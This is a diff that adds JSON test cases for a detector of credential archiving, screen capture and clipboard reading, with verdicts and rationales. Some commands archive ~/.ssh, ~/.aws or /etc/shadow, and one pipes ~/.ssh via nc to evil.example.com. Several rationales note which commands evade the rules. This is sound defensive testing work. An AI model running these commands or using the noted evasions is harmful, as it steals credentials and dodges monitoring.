+    "rationale": "Malicious archive is one link of an && chain; $HOME/.aws matches $home(?:\\s|$)? no - matches the .aws home-cred branch via /.aws -> correctly fires, a realistic chained attack."
+  },
+  {
+    "command": "tar    czf     /tmp/h.tgz   ~",
+    "target_signal": "collection.archive_staging",
+    "should_fire": true,
+    "rationale": "Extra-space padding plus a bare ~ (whole home dir) still matches ~(?:\\s|$); confirms spacing alone does not evade and is a true stage-before-exfil."
+  },
+  {
+    "command": "XZ_OPT=-9 tar --create --file=loot.tar /etc/shadow",
+    "target_signal": "collection.archive_staging",
+    "should_fire": true,
+    "rationale": "Env-var prefix and --create long form archiving /etc/shadow; the --create alt and /etc/shadow branch both match -> true positive."
+  },
+  {
+    "command": "tar -czf - ~/.ssh | nc evil.example.com 443",
+    "target_signal": "collection.archive_staging",
+    "should_fire": true,
+    "rationale": "Pipe-to-network exfil of ~/.ssh; create branch + .ssh both match -> clear staging+exfil attack that fires."
+  },
+  {
+    "command": "zip -er /tmp/bak.zip ~/.password-store",
+    "target_signal": "collection.archive_staging",
+    "should_fire": true,
+    "rationale": "Encrypted recursive zip of the pass password-store; zip\\s+-\\S+\\s+-[a-z]*r matches -er and .password-store matches -> true positive."
+  },
+  {
+    "command": "tar czf /tmp/ssh-backup.tar.gz ~/.ssh",
+    "target_signal": "collection.archive_staging",
+    "should_fire": true,
+    "rationale": "Straightforward credential-store archive; clean true positive to balance the corpus."
+  },
+  {
+    "command": "7z a /tmp/vault.7z ~/.aws",
+    "target_signal": "collection.archive_staging",
+    "should_fire": true,
+    "rationale": "Canonical '7z a' creating an archive of the AWS cred dir; clean true positive."
+  },
+  {
+    "command": "tar xzf release-1.4.2.tar.gz -C ./vendor",
+    "target_signal": "collection.archive_staging",
+    "should_fire": false,
+    "rationale": "Extraction (x, no c) of a release tarball into a project dir; create branch requires a 'c' token so it stays quiet -> correct benign."
+  },
+  {
+    "command": "tar czf dist.tar.gz ./build",
+    "target_signal": "collection.archive_staging",
+    "should_fire": false,
+    "rationale": "Normal project build archive with no home/cred path; correctly stays quiet."
+  },
+  {
+    "command": "zip -r site.zip ./public  # nightly backup, sync ~ later",
+    "target_signal": "collection.archive_staging",
+    "should_fire": false,
+    "rationale": "Benign project zip, but the over-greedy [^\\n]*~(?:\\s|$) matches a bare ~ inside a trailing COMMENT -> regex WRONGLY fires (false positive)."
+  },
+  {
+    "command": "tar czf docs.tgz ./.docker-compose-notes",
+    "target_signal": "collection.archive_staging",
+    "should_fire": false,
+    "rationale": "Archiving a project file whose name starts ./.docker-...; the .docker\\b alternation matches the substring before the hyphen -> false positive on a normal project path."
+  },
+  {
+    "command": "flameshot gui -p /tmp/cap.png",
+    "target_signal": "collection.screen_capture",
+    "should_fire": true,
+    "rationale": "flameshot is a mainstream Linux screenshot tool not in the tool list and the .png arg follows 'gui -p' not 'import', so nothing matches -> evasion MISS."
+  },
+  {
+    "command": "screencapture -x -t png /tmp/desktop.png",
+    "target_signal": "collection.screen_capture",
+    "should_fire": true,
+    "rationale": "macOS screencapture utility; \\bscreencapture\\b matches -> clean true positive."
+  },
+  {
+    "command": "import -window root /tmp/screen.png",
+    "target_signal": "collection.screen_capture",
+    "should_fire": true,
+    "rationale": "ImageMagick import grabbing the root window to PNG; the -window \\w+ optional group plus \\S*\\.png matches -> true positive."
+  },
+  {
+    "command": "python3 -c \"import requests, os\"",
+    "target_signal": "collection.screen_capture",
+    "should_fire": false,
+    "rationale": "Python import keyword with no image-file token; the import alt requires a .png/.jpg target so it stays quiet -> correct benign (intended exclusion)."
+  },
+  {
+    "command": "xclip -selection clipboard -o > /tmp/clip.txt",
+    "target_signal": "collection.clipboard",
+    "should_fire": true,
+    "rationale": "Canonical X11 clipboard READ; 'clipboard' has no leading dash so it breaks the (?:-\\S+\\s+)* run before -o -> the standard read command EVADES (major false negative)."
+  },
+  {
+    "command": "pbpaste | grep -i password",
+    "target_signal": "collection.clipboard",
+    "should_fire": true,
+    "rationale": "macOS clipboard read scraping for secrets; \\bpbpaste\\b matches -> clean true positive."
+  },
+  {
+    "command": "powershell -c Get-Clipboard | Out-File c.txt",
+    "target_signal": "collection.clipboard",
+    "should_fire": true,
+    "rationale": "PowerShell clipboard read; get-clipboard\\b matches the lowercased view -> true positive."
+  },
+  {
+    "command": "xsel -ib < /tmp/payload.txt",
+    "target_signal": "collection.clipboard",
+    "should_fire": false,
+    "rationale": "This is a clipboard WRITE (-i input, -b board); but xsel\\s+-\\S*[bo] matches the 'b' in -ib -> regex WRONGLY fires on a write (false positive)."
+  },
+  {
+    "command": "pbcopy < /tmp/secret.txt",
+    "target_signal": "collection.clipboard",
+    "should_fire": false,
+    "rationale": "Clipboard WRITE via pbcopy; not in the read alternation so it correctly stays quiet -> intended benign exclusion."
+  }
+]
